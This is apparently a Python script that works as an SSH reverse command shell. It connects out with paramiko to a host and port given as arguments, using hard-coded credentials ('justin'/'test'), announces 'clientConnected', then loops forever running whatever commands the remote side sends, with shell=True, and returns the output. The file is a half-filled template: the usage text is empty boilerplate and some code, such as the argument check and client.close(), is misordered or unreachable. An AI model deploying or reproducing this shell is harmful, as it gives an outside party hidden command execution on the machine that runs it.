#! /usr/bin/python

# -----------------------------------------------------------------------------------------------------------------------------
# GENERAL
# -----------------------------------------------------------------------------------------------------------------------------
#
# author: Sebastiaan Van Hoecke
# mail: sebastiaan@sevaho.io
#
# NOTE:
#
# -----------------------------------------------------------------------------------------------------------------------------

import sys
import getopt
import threading
import paramiko
import subprocess

# -----------------------------------------------------------------------------------------------------------------------------
# GLOBAL VARIABLES
# -----------------------------------------------------------------------------------------------------------------------------

var     = ""

# -----------------------------------------------------------------------------------------------------------------------------
# FUNCTIONS
# -----------------------------------------------------------------------------------------------------------------------------


def usage ():

    print("Usage: %s [OPTIONS]... [ARGS]... \
            \n \
            \n  description\
            \n \
            \nOPTIONS:\
            \n \
            \n  -h, *       display the help and exit\
            \n \
            \nEXAMPLES:\
            \n \
            \nNOTE:\
            \n \
            " % (sys.argv[0]))

    sys.exit(1)


def ssh_command (ip, port, username, password, command):

    client = paramiko.SSHClient()
    # client.load_host_keys('/home/sevaho/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:

        # ssh_session.exec_command(command)
        ssh_session.send(command)
        # print(ssh_session.recv(1024))

        while True:

            command = ssh_session.recv(1024)

            try:

                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)

            except Exception as e:

                print(e)
                # ssh_session.send(e)

        client.close()

    return

# -----------------------------------------------------------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------------------------------------------------------


def main (argv):

    ssh_command(argv[0], argv[1], 'justin', 'test', 'clientConnected')
    global var

    # atleast 1 argument required
    if not len(argv):
        usage()

    try:

        opts, args = getopt.getopt(argv, "ha:", ["help"])

    except getopt.GetoptError as err:

        print("error: %s" % (str(err)))
        usage()

    for opt, arg in opts:

        if opt in ("-h", "--help"):
            usage()
        elif opt in ("-a", "--arg1"):
            print(arg)
        else:
            assert False, "Unhandled Option"


if __name__ == "__main__":

    main(sys.argv[1:])
